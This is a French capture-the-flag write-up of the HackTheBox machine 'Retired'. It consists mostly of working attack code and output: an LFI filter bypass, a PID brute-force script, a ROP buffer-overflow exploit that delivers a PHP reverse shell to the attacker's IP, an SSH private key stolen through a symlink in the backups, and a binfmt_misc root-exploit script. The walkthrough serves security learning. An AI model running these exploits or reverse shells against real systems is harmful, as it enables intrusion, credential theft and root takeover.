# RETIRED HACKTHEBOX

![image retired hackthebox](./images/Retired.png)

# ENUMERATION

## NMAP

Dans un premier temps, on va utiliser nmap afin de connaitre les ports ouverts sur la machine.

![nmap](./images/nmap.png)

on peut donc voir 2 ports ouverts, un serveur ssh sur le port 22 et un serveur web sur le port 80

## DIRSEARCH

![dirsearch](./images/dirsearch.png)

on se rend donc sur le site web et on lance un dirsearch afin de voir si l'ont ne trouve pas des fichiers/dossiers intéressant.

# INITIAL ACCESS

## WEB

En se rendant sur le site web on se rend compte directement qu'il y a un parametre get page qui a pour valeur default.html. Je pense donc directement à une lfi https://brightsec.com/blog/local-file-inclusion-lfi/

![website](./images/website.png)

après quelques tests je trouve le code source de mon index.php en utilisant un filtre php.

http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=index.php

```php
<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>
```

On peut donc voir ici 2 filtre à bypass afin de mener à bien notre lfi.

Pour passer la fonction sanitize_input je vous propose cette solution : "..../.././/" qui à la sortie de la fonction sanitize_input deviendra "../"

et ensuite le preg_match() veut que notre fichier commence par des une lettre entre a-z (enfin je crois j'connais pas trop les regex) donc grace à notre énumération ou au code source de la page on voit un dossier js alors on va juste faire page=js/..../.././/

Parfait on a veski le filtre comme il faut !

maintenant il s'agit de l'exploiter ...

## WEB EXPLOITATION

Là ça a été assez compliqué, j'ai passé plusieurs heures à essayer de reverse shell par les logs, env, prod/pid/fd enfin bref j'ai essayé toutes les techniques possible et imaginable afin de reverse shell comme un débile. Et au bout d'un moment, un éclair de génie ! Je me suis dit je vais check à nouveau le code source de mon index.php ... Et je vois qu'il utilise la fonction readfile !
Après une recherche google :  https://stackoverflow.com/questions/36494361/do-file-get-contents-and-readfile-execute-php-code

**readfile do not execute code.** 

J'avais envie de casser mon écran, dieu merci je suis une personne calme.
J'ai décidé de faire une pause et d'aller à la salle de sport ce qui m'a permis de réfléchir ... ET LA ECLAIR DE GENIE !
Je me souviens avoir vu dans les logs un fichier php activate_license.php (peut être qu'il fallait le trouver en énumérant les fichiers au début mais mes worldlists l'ont pas eu.)
Je décide donc de récuperer son code source avec mon filtre php utilisé plus haut pour récuperer index.php

```php
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

à partir de là je commence à chercher toute sortes d'exploit pour les sockets ou quoi enfin bref des betises.
Et à ce moment là, le fait d'avoir galéré à vouloir reverse-shell me fait avoir une idée. J'ai beaucoup touché au /proc de en essayant de reverse shell et j'me dis "et si je bruteforçai les pid" !
A ce moment là j'étais desespéré vraiment j'avais 0 espoirs dans ce que je faisais. Je fais donc un ptit script python pour ça :

```py
import requests

def brute_pid():
	pid_max = int(requests.get("http://10.10.11.154/index.php?page=js/..../.././/..../.././/..../.././/..../.././/..../.././/proc/sys/kernel/pid_max").text)  # récuperer le pid maximum
	print(f"[+] pid max is {pid_max}")
	for pid in range(0, pid_max):
		r = requests.get(f"http://10.10.11.154/index.php?page=js/..../.././/..../.././/..../.././/..../.././/..../.././/proc/{pid}/cmdline")
		if r.text:
			print(f"[+] process found : {pid} ->" + r.text.replace('\x00', ' '))

if __name__ == "__main__":
	try:
		brute_pid()
	except KeyboardInterrupt:
		exit()
```

Ici on va donc faire une première requete afin de récuperer le pid maximum, et ensuite on va les bruteforce un part un et récuperer le contenu de /proc/pid/cmdline qui contient les arguments passé en ligne de commande pour lancer le process.

```
root@debian:~# python3 brute_pid.py 
[+] pid max is 4194304
[+] process found : 399 -> /usr/bin/activate_license 1337
[+] process found : 573 -> nginx: worker process
[+] process found : 574 -> nginx: worker process
```

Super intéressant ! On peut donc récuperer notre executable grâce à notre lfi

```wget http://10.10.11.154/index.php?page=js/..../.././/..../.././/..../.././/..../.././/..../.././/usr/bin/activate_license```

## REVERSE

Je commence donc à reverse le binaire, et j'me dis "ahaha imagine c'est du pwn"

![IMAGE CLOWN](./images/clown.gif)

Je continue donc de reverse, je trouve le nom d'une base de donnée sqlite dans laquelle sont stocké les clés d'activation.

![image reverse](./images/sqlite_filename.png)

après avoir bruteforce un peu les répertoires je trouve la base de donnée je l'a download et je trouve absolument rien à l'intérieur.

Donc dépité je reviens à mon binaire.

On voit qu'en premier quand le socket reçoit la connexion il récupère les 4 premiers octets, qui sont la taille de notre license envoyé par la page php 

```php
$license_size = $_FILES['licensefile']['size'];
$license      = file_get_contents($_FILES['licensefile']['tmp_name']);
[...]
socket_write($socket, pack("N", $license_size));
socket_write($socket, $license);
```

![getsize](./images/get_size.png)

et ensuite il va récuperer dans un buffer de 512 char notre license avant de l'envoyer dans la base de donnée.
sauf que, il récupère $msglen char de notre license, on va donc pour dépasser de notre buffer et écrire dans la mémoire. 

On a donc un buffer overflow !

![image buffer overflow](./images/buffer_overflow.png)

J'ai trouvé quelque chose d'intéressant !

![gif heureux](./images/happy.gif)

C'est du pwn !

![gif triste](./images/sad.gif)

## PWN

je me met donc à exploiter ça en local, je réussi assez facilement à écraser l'addresse de retour de ma fonction activate_license mais ensuite ça deviens compliqué !

cette partie fut très très longue, surtout pour moi qui fait très peu de pwn.

### 1er soucis

lorsque notre binaire reçoit une connexion, il créé un fork (pas sur que ça se dise comme ça mais en gros il fait ça : https://www.geeksforgeeks.org/fork-system-call/) donc chiant à debug 
### solution
 gdb nous permet de pouvoir soit follow les fork créé ou follow le process parent ``set follow-fork-mode child/parent``



### 2ème soucis
grâce à notre lfi (en regardant le contenu de /proc/sys/kernel/randomize_va_space) on a pu verifier si l'aslr était activé et malheuresment elle l'était https://fr.wikipedia.org/wiki/Address_space_layout_randomization
### solution
encore notre lfi, on peut accéder à /proc/pid/maps qui va nous montrer comment est réparti la mémoire du process (pas convaincu que ça se dise comme ça encore une fois mais en bref on connais les addresses)

```
56140fd23000-56140fd24000 r--p 00000000 08:01 2408 /usr/bin/activate_license
56140fd24000-56140fd25000 r-xp 00001000 08:01 2408 /usr/bin/activate_license
56140fd25000-56140fd26000 r--p 00002000 08:01 2408 /usr/bin/activate_license
56140fd26000-56140fd27000 r--p 00002000 08:01 2408 /usr/bin/activate_license
56140fd27000-56140fd28000 rw-p 00003000 08:01 2408 /usr/bin/activate_license
561410fbf000-561410fe0000 rw-p 00000000 00:00 0 [heap] 
7fa18acaf000-7fa18acb1000 rw-p 00000000 00:00 0 
7fa18acb1000-7fa18acb2000 r--p 00000000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 
7fa18acb2000-7fa18acb4000 r-xp 00001000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 
7fa18acb4000-7fa18acb5000 r--p 00003000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 
7fa18acb5000-7fa18acb6000 r--p 00003000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 
[...]
7fa18ae1c000-7fa18ae1d000 rw-p 00142000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 
7fa18ae1d000-7fa18ae42000 r--p 00000000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 
7fa18ae42000-7fa18af8d000 r-xp 00025000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 
7fa18af8d000-7fa18afd7000 r--p 00170000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 
7fa18afd7000-7fa18afd8000 ---p 001ba000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 
7fa18afd8000-7fa18afdb000 r--p 001ba000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 
7fa18afdb000-7fa18afde000 rw-p 001bd000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 
7fa18afde000-7fa18afe2000 rw-p 00000000 00:00 0 
7fa18afe2000-7fa18aff2000 r--p 00000000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 
[...]
7fa18b157000-7fa18b158000 rw-p 0002a000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 
7fa18b158000-7fa18b159000 rw-p 00000000 00:00 0 7ffc1c50c000-7ffc1c52d000 rw-p 00000000 00:00 0 [stack] 
7ffc1c5d1000-7ffc1c5d5000 r--p 00000000 00:00 0 [vvar] 
7ffc1c5d5000-7ffc1c5d7000 r-xp 00000000 00:00 0 [vdso] 
```



### 3ème soucis
NX et PIE d'activé comme sécuritée sur le binaire
### solution
ropchain ou ret2libc 
- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming
- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
(super blog)



### 4ème soucis
je trouve pas les gadgets nécessaire pour ropchain afin de mener à bien notre ret2libc
### solution
trouver nos gadgets dans la libc



### exploit

donc voici ce que j'ai trouvé pour mener à bien cette exploitation :

```
libc :
	mov qword ptr [rsi], rdi ; ret
	function system()

binary :
	pop rdi ; ret
	pop rsi; pop r15; ret;
```

grâce à ça on va pouvoir copier notre payload dans une section où l'ont peu écrire et le retrouver facilement pour ma part j'ai choisis .data

pour ça j'utilse :

```
pop rdi; ret                    ---> on met notre payload dans rdi
paylaod
pop rsi; pop r15; ret;          ---> on met l'addresse de .data dans rsi
address of .data
NULL
mov qword ptr [rsi], rdi; ret   ---> on déplace notre payload à l'addresse de .data
pop rdi; ret                    ---> on met dans rdi l'addresse de notre payload donc .data 
                                ---> voir https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame
address of .data
call system
```

Vu comme ça c'est assez rapide mais j'y est passé énormément de temps

```py
import struct
import requests

def get_pid():
	pid_max = int(requests.get("http://10.10.11.154/index.php?page=js/..../.././/..../.././/..../.././/..../.././/..../.././/proc/sys/kernel/pid_max").text)
	print(f"[+] pid max is {pid_max}")
	for pid in range(0, pid_max):
		r = requests.get(f"http://10.10.11.154/index.php?page=js/..../.././/..../.././/..../.././/..../.././/..../.././/proc/{pid}/cmdline")
		if r.text.encode() == b'/usr/bin/activate_license\x001337\x00':
			print(f"[+] pid found : {pid}")
			return pid

def get_base_address(pid):
	base = requests.get(f"http://10.10.11.154/index.php?page=js/..../.././/..../.././/..../.././/..../.././/..../.././/proc/{pid}/maps").text.split("-")[0]
	print(f"[+] base found : 0x{base}")
	return int(base, base=16)

def get_libc_base(pid):
	base = requests.get(f"http://10.10.11.154/index.php?page=js/..../.././/..../.././/..../.././/..../.././/..../.././/proc/{pid}/maps").text.split("\n")[23][:12]
	print(f"[+] libc found : 0x{base}")
	return int(base, base=16)

pid = get_pid()
base_address = get_base_address(pid)
libc_base    = get_libc_base(pid)


payload = b"php -r '$sock=fsockopen(\"10.10.14.59\",4000);exec(\"sh <&3 >&3 2>&3\");'"
n = 8
command = [payload[i:i+n] for i in range(0, len(payload), n)]
command[-1] = command[-1] + b"\x00" * (8 - len(command[-1]))

print("[~] building payload ...")
payload = b"a" * (512 + 8)                                      # padding : buffer[512] + 8

for i in range(len(command)):
	payload += struct.pack("<Q", base_address + 0x000000000000181b)   # pop rdi ; ret
	payload += command[i]                                             # payload
	payload += struct.pack("<Q", base_address + 0x0000000000001819)   # pop rsi; pop r15; ret;
	payload += struct.pack("<Q", base_address + 0x00004000 + (8 * i)) # address of .data
	payload += struct.pack("<Q", 0x0)                                 # NULL
	payload += struct.pack("<Q", libc_base + 0x0000000000118b7d)      # mov qword ptr [rsi], rdi ; ret


payload += struct.pack("<Q", base_address + 0x000000000000181b) # pop rdi ; ret
payload += struct.pack("<Q", base_address + 0x00004000)         # address of .data = payload

payload += struct.pack("<Q", libc_base + 0x48e50)               # address of system in the libc
payload += struct.pack("<Q", 0x00000000)
print("[+] payload built ! ")

print("[~] sending payload")
r = requests.post("http://10.10.11.154/activate_license.php", files={'licensefile' : ('payload', payload)} )
print("[+] paylaod sent !")
```

voilà mon exploit afin d'avoir un reverse shell.

on le lance :

```
root@debian:~# python3 exploit.py
[+] pid max is 4194304
[+] pid found : 399
[+] base found : 0x56140fd23000
[+] libc found : 0x7fa18ae1d000
[~] building payload ...
[+] payload built ! 
[~] sending payload
[+] paylaod sent !
```

et on reçoit bien notre reverse shell !

```
root@debian:~# nc -nlvp 4000
Listening on 0.0.0.0 4000
Connection received on 10.10.11.154 52388
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@retired:/var/www$ whoami
whoami
www-data
www-data@retired:/var/www$ 
```

A partir de là on va pouvoir privesc.

# PRIVILEGE ESCALATION


## WWW-DATA

ici, après quelques recherche on trouve un service qui tourne toutes les minutes et qui fait des backups.

```
www-data@retired:/etc/systemd/system$ cat /etc/systemd/system/website_backup.*
[Unit]
Description=Backup and rotate website

[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup

[Install]
WantedBy=multi-user.target
[Unit]
Description=Regularly backup the website as long as it is still under development

[Timer]
OnCalendar=minutely

[Install]
WantedBy=multi-user.target
```

on a donc un script /usr/bin/webbackup executé chaques minutes par l'utilisateur dev et qui va faire des backups

```bash
#!/bin/bash
set -euf -o pipefail

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```

```
www-data@retired:/var/www$ cd /var/www/; ls
2022-06-28_12-45-01-html.zip  2022-06-28_12-46-01-html.zip  2022-06-28_12-47-03-html.zip  html  license.sqlite  var
```

```
www-data@retired:/tmp$ ln -s /etc/passwd zebi
www-data@retired:/tmp$ zip test.zip zebi 
  adding: zebi (deflated 64%)
www-data@retired:/tmp$ unzip test.zip 
Archive:  test.zip
zebi exists and is a symbolic link.
replace zebi? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: zebi                    
www-data@retired:/tmp$ ls -l zebi
-rw-r--r-- 1 www-data www-data 1488 Oct 13  2021 zebi
www-data@retired:/tmp$ cat zebi 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
```

ici premièrement on fait un lien symbolique vers /etc/passwd
ensuite on va zipper ce lien symbolique puis le dézipper
et on va se rendre compte que l'on a zipper le fichier /etc/passwd et lorsqu'on l'a dézipper on a récupéré son contenu et ce n'est plus un lien symbolique.

à partir de là, on va pouvoir exploiter notre script de backup.

```
ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa
```

on va ensuite attendre que le script soit executé.

```
www-data@retired:/var/www$ ls
2022-06-28_13-02-03-html.zip  2022-06-28_13-04-01-html.zip  html	    var
2022-06-28_13-03-03-html.zip  2022-06-28_13-05-03-html.zip  license.sqlite
www-data@retired:/var/www$ unzip -d /tmp 2022-06-28_13-05-03-html.zip
Archive:  2022-06-28_13-05-03-html.zip
   creating: /tmp/var/www/html/
   creating: /tmp/var/www/html/js/
  inflating: /tmp/var/www/html/js/scripts.js  
   creating: /tmp/var/www/html/.ssh/
  inflating: /tmp/var/www/html/activate_license.php  
   creating: /tmp/var/www/html/assets/
  inflating: /tmp/var/www/html/assets/favicon.ico  
   creating: /tmp/var/www/html/assets/img/
  inflating: /tmp/var/www/html/assets/img/close-icon.svg  
  inflating: /tmp/var/www/html/assets/img/navbar-logo.svg  
   creating: /tmp/var/www/html/assets/img/about/
  inflating: /tmp/var/www/html/assets/img/about/2.jpg  
  inflating: /tmp/var/www/html/assets/img/about/4.jpg  
  inflating: /tmp/var/www/html/assets/img/about/3.jpg  
  inflating: /tmp/var/www/html/assets/img/about/1.jpg  
   creating: /tmp/var/www/html/assets/img/logos/
  inflating: /tmp/var/www/html/assets/img/logos/facebook.svg  
  inflating: /tmp/var/www/html/assets/img/logos/microsoft.svg  
  inflating: /tmp/var/www/html/assets/img/logos/google.svg  
  inflating: /tmp/var/www/html/assets/img/logos/ibm.svg  
   creating: /tmp/var/www/html/assets/img/team/
  inflating: /tmp/var/www/html/assets/img/team/2.jpg  
  inflating: /tmp/var/www/html/assets/img/team/3.jpg  
  inflating: /tmp/var/www/html/assets/img/team/1.jpg  
  inflating: /tmp/var/www/html/assets/img/header-bg.jpg  
  inflating: /tmp/var/www/html/beta.html  
  inflating: /tmp/var/www/html/default.html  
  inflating: /tmp/var/www/html/index.php  
  inflating: /tmp/var/www/html/id_rsa  
   creating: /tmp/var/www/html/css/
  inflating: /tmp/var/www/html/css/styles.css  
www-data@retired:/var/www$ cd /tmp/var/www/html/
www-data@retired:/tmp/var/www/html$ ls
activate_license.php  beta.html  default.html  index.php
assets		      css	 id_rsa        js
www-data@retired:/tmp/var/www/html$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA2090vSkzICytlOHL9EbguWPhsai40A3RzSYDlldalPTp/0G8ge3I
j6Wslike4GM7149go4dhKOCmP6b1aL/wIg2Ig56ZN3j2wn7oxDYl2CsJFusuDLlK+vuT9W
zrv4YnzvPL0RVMIsbGdzevaaRNsGc4mk6xOpsIFsQngj4dVpeJzOhPHu0W0CEgXhK6SHJP
6oTRKpxrY4IupwGG/P6bl0QUaVWkVFOhCwdlOkuCCGFSMsimLHDpUT7g2Sa9aZdBao21Rd
0C4pYVy/MmheDdGzkUB/uCNYRf65rfdMXxQ67cVFOI62OubpNn/YCtkmLOI9RbQV+YHTRm
FqbNgfYqc3rj4wGLYYZh7PeZq/rKa+aCmvSsxTnVKKZX5wTxms6ejhGxTnpydK4LyXMnYN
+JYwNHZYzN68NHii0vgzidv0K6U48y+OdNvJnPPtkdqOroZoXBMj5ZaEvNRDdoKZVddJqi
0EfCDkKwW9BUiJyqBYFDoIFgJ0VVJNCSKywQPF+XAAAFiL1YrcW9WK3FAAAAB3NzaC1yc2
EAAAGBANtPdL0pMyAsrZThy/RG4Llj4bGouNAN0c0mA5ZXWpT06f9BvIHtyI+lrJYpHuBj
O9ePYKOHYSjgpj+m9Wi/8CINiIOemTd49sJ+6MQ2JdgrCRbrLgy5Svr7k/Vs67+GJ87zy9
EVTCLGxnc3r2mkTbBnOJpOsTqbCBbEJ4I+HVaXiczoTx7tFtAhIF4SukhyT+qE0Sqca2OC
LqcBhvz+m5dEFGlVpFRToQsHZTpLgghhUjLIpixw6VE+4NkmvWmXQWqNtUXdAuKWFcvzJo
Xg3Rs5FAf7gjWEX+ua33TF8UOu3FRTiOtjrm6TZ/2ArZJiziPUW0FfmB00ZhamzYH2KnN6
4+MBi2GGYez3mav6ymvmgpr0rMU51SimV+cE8ZrOno4RsU56cnSuC8lzJ2DfiWMDR2WMze
vDR4otL4M4nb9CulOPMvjnTbyZzz7ZHajq6GaFwTI+WWhLzUQ3aCmVXXSaotBHwg5CsFvQ
VIicqgWBQ6CBYCdFVSTQkissEDxflwAAAAMBAAEAAAGBAMXvD3COV6tJR5zgsaAVvEr2P8
OFgM+eOWWLUp+E1acs6GhN3yHxBxvGrl6UXF6ukVr694B/9gvbvZAjUsiousUxK62HHce4
MBXYTqKQMFXKeZiqx9QKBAdDugU+ugMQxKr+1EwviZi1iHge1P1mogt9DdQPA9veAk3x2a
qt/vKhMGi0nnxOBVHxI/JjuqcaLNB/8PwhUrbrzslCEqAR90Ft23I6LmdBV07J7O3RKln/
5B0bhQcFHT8Lngm+8iLztBYPAygMETHOgCaf9lTunMNJ70nCx84MlS9VbB1kSwutmisCaf
Hgm/7VreFsLIlBjtGeklrKUggr74XiRJl50LC/KUXzcVkvrc2UK4QX9esaCNeBOnDMoD9t
gvfZtI8fjYqQ08PMD2eCHUQY+yaxa1QXPHqhAAxJV/5xkZKZmrkq8qinv3HrJ9qtKyCFo/
N9f/mCpcb81Y266BOQ91uRVBh3g23XG6n9EK3nCwqIyEtChT5dHdhFkvVMW7Wh5o+FEQAA
AMB0atziCxqeBAq+3j/I3r13LUnfVmLesWvY6jJFl5zgaHeRiH88JhlVbUVes8to4q284Y
0+yH+U7339MGytMIFE6oWmO08qojojSvs1w3gcQiVea2l+vM3fCcllY7XUz6djLjiowqrc
AMlULmLSmXVXJogfYb15f6P9s5VN32hKFAR7hyZniTZs/uvPYOm6C+joqn2qSdxgtdYcip
aU7IBfVJWxtg8aM6eXzxnZIMPbbNUnakdthTTtVeJDQiz8ELsAAADBAO0UJvhVae6hdtbF
QCA7AkBCyFWSW7efNzhkal2QEDyYMtonvGN8yV7i9NoIIO3bAPNM863ZJCohaVdFiGztEb
aUzsJWFxslIvj67+2v1GQ5IFpPBwYNKAXwjsAZqw5yREMH/BIxJ2kT5frFBpnqFgjuagJ0
suSXr7HZaHWGbXAYjmoj6h2JsyYAVKONaqkgyWTF+AunZNLVduplVL8sa2/fsGHlb056WX
N7EFkiXadFFe0LrxMdkubOIUScihfIrwAAAMEA7NBFlShxtgbZ0rJ8WgBWp8aIez2iN/O/
ck1irhAfnr/VUnRQz+1POxemKnXhEFeEdusvAunTZw/SCyBJT9E+DUsBBNz8yr6dc17OOk
j+/jztoXyoHTW3qCdW0y+Ev1p3lbm8scE2xkt28/3DXKV31Eb9ZeABurNXYBHjH+CffCOS
bp4S6L7RNp7a7/vU5D+I7EMTc7aCRwtq/UK8QmTlUiOhS8UzIvp36vGvzwPNIb877qGdwJ
ZjGoA1uj9VP0GZAAAAC2RldkByZXRpcmVkAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
www-data@retired:/tmp/var/www/html$ 
```

parfait ! On a récupéré une clé rsa afin de pouvoir se login en tant que dev.

## dev

Bon, le writeup devient long et cette box commence à me souler donc je vais être speed sur la deuxième partie.

```
root@debian:~# ssh -i htb-retired_id_rsa_dev dev@10.10.11.154
Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun 28 13:04:22 2022 from 10.10.14.13
dev@retired:~$ ls
activate_license  emuemu  exploit.sh  user.txt
dev@retired:~$ ls emuemu/
Makefile  README.md  emuemu  emuemu.c  reg_helper  reg_helper.c  test
dev@retired:~$ cat emuemu/reg_helper.c 
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
dev@retired:~$ 
```

donc ici on se login en tant que dev, ensuite on trouve un dossier emuemu.

on trouve ensuite un programme en C qui va écrire dans /proc/sys/fs/binfmt_misc/register

```
dev@retired:~$ cat emuemu/Makefile 
CC := gcc
CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion

SOURCES := $(wildcard *.c)
TARGETS := $(SOURCES:.c=)

.PHONY: install clean

install: $(TARGETS)
	@echo "[+] Installing program files"
	install --mode 0755 emuemu /usr/bin/
	mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
	install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
	setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper

	@echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
	echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
		| tee /usr/lib/binfmt.d/emuemu.conf \
		| /usr/lib/emuemu/reg_helper

clean:
	rm -f -- $(TARGETS)
```

on voit que dans le Makefile il lui set la capabilites cap_dac_override https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override

**This mean that you can bypass write permission checks on any file, so you can write any file.**

on peut donc écrire dans le fichier /proc/sys/fs/binfmt_misc/register

ensuite on trouve cet exploit : https://github.com/toffan/binfmt_misc

que l'ont va modifier un peu

```bash
#!/bin/bash

readonly searchsuid="/bin/"
readonly mountpoint="/proc/sys/fs/binfmt_misc"
readonly exe="$0"


warn()
{
    1>&2 echo $@
}

die()
{
    warn $@
    exit -1
}

usage()
{
    cat 1>&2 <<EOF
Usage: $exe
    Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,
    note that it must be enforced by any other mean before your try this, for
    example by typing something like "sudo chmod +6 /*/*/f*/*/*r" while Dave is
    thinking that you are fixing his problem.
EOF
    exit 1
}

function not_writeable()
{
	test ! -w "$mountpoint/register"
}

function pick_suid()
{
	find "$1" -perm -4000 -executable \
	    | tail -n 1
}

function read_magic()
{
    [[ -e "$1" ]] && \
    [[ "$2" =~ [[:digit:]]+ ]] && \
    dd if="$1" bs=1 count="$2" status=none \
        | sed -e 's-\x00-\\x00-g'
}

[[ -n "$1" ]] && usage

# not_writeable && die "Error: $mountpoint/register is not writeable"

target="$(pick_suid "$searchsuid")"
test -e "$target" || die "Error: Unable to find a suid binary in $searchsuid"

binfmt_magic="$(read_magic "$target" "126")"
test -z "$binfmt_magic" && die "Error: Unable to retrieve a magic for $target"

fmtname="$(mktemp -u XXXX)"
fmtinterpr="$(mktemp)"

gcc -o "$fmtinterpr" -xc - <<- __EOF__
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <pwd.h>

	int main(int argc, char *argv[])
	{
		// remove our temporary file
		unlink("$fmtinterpr");

		// remove the unused binary format
		FILE* fmt = fopen("$mountpoint/$fmtname", "w");
		fprintf(fmt, "-1\\n");
		fclose(fmt);

		// MOTD
		setuid(0);
		uid_t uid = getuid();
		uid_t euid = geteuid();
		struct passwd *pw = getpwuid(uid);
		struct passwd *epw = getpwuid(euid);
		fprintf(stderr, "uid=%u(%s) euid=%u(%s)\\n",
			uid,
			pw->pw_name,
			euid,
			epw->pw_name);

		// welcome home
		char* sh[] = {"/bin/sh", (char*) 0};
		execvp(sh[0], sh);
		return 1;
	}
__EOF__

chmod a+x "$fmtinterpr"

binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
echo "$binfmt_line" | /usr/lib/emuemu/reg_helper

exec "$target"
```

ensuite on va l'executer

```
dev@retired:/tmp$ ./binfmt_rootkit
uid=0(root) euid=0(root)
# cd /root     	
# ls 
cleanup.sh  root.txt
# cat root.txt
71f643297b178855e1bca48141e773cc
```
et magie ! on est enfin root !
